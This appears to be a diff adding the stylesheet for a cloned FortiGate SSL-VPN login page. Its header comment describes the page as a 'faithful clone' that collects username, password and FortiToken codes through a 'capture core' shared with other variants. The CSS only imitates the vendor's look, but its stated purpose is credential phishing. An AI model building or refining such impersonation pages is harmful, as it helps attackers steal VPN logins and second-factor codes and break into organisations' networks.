@@ -1,0 +1,23 @@
+/* FortiGate SSL-VPN web portal "Please Login" — faithful clone. Single-page
+   username+password (+ FortiToken). Capture core (name=email/password/code_2fa)
+   shared with the other variants. */
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;min-height:100vh;background:#fff;font-family:Verdana,Helvetica,Arial,sans-serif;color:#26282e}
+.fgt-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.fgt-card{width:100%;max-width:344px;border:1px solid #c9ccd1;background:#fbfbfc;box-shadow:0 1px 2px rgba(0,0,0,.06)}
+.fgt-head{display:flex;align-items:center;gap:10px;background:#36435c;color:#fff;padding:11px 14px}
+.fgt-logo{display:block}
+.fgt-title{font-size:14px;font-weight:700;letter-spacing:.2px}
+.fgt-body{padding:22px 20px 20px}
+.fgt-input{display:block;width:100%;height:30px;padding:4px 8px;margin:0 0 10px;border:1px solid #c4c7cc;border-radius:2px;font-size:13px;color:#26282e;background:#fff;outline:none}
+.fgt-input:focus{border-color:#5b9bd5}
+.fgt-token{letter-spacing:.3em;font-family:Consolas,Menlo,monospace}
+.fgt-actions{margin-top:14px}
+.fgt-btn{display:block;width:100%;height:32px;margin:0 0 8px;border-radius:2px;font-size:13px;font-family:inherit;cursor:pointer;border:1px solid transparent}
+.fgt-login{background:#cb3a2a;color:#fff;border-color:#b73225;font-weight:700}
+.fgt-login:hover{background:#b73225}
+.fgt-fc{background:#fff;color:#26282e;border:1px solid #c4c7cc}
+.fgt-fc:hover{background:#f1f1f2}
+.fgt-2fa-info{font-size:12.5px;color:#444;margin:0 0 12px}
+.fgt-2fa-info span{font-weight:700}
+@media(max-width:420px){.fgt-card{max-width:none}.fgt-input{height:40px;font-size:16px}}
